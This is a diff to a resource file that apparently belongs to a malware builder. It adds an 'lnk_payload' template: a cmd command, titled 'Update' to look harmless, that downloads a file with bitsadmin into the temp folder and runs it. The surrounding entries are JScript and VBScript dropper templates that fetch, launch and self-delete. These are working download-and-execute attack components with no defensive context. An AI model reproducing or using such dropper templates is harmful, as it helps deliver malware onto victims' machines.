@@ -187,6 +187,9 @@ Stream.Close();
 new ActiveXObject("Shell.Application").ShellExecute(pOut,"","","open","1");
 new ActiveXObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName);</value>
   </data>
+  <data name="lnk_payload" xml:space="preserve">
+    <value>/c @echo off &amp;&amp; title Update &amp;&amp; bitsadmin /transfer mdj /download /priority FOREGROUND {0} "%temp%\\{1}" &amp;&amp; start "" "%temp%\\{2}"</value>
+  </data>
   <data name="vbs_payload" xml:space="preserve">
     <value>dim pOut, xHttp, bStrm
 pOut = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) &amp; "\\{0}"
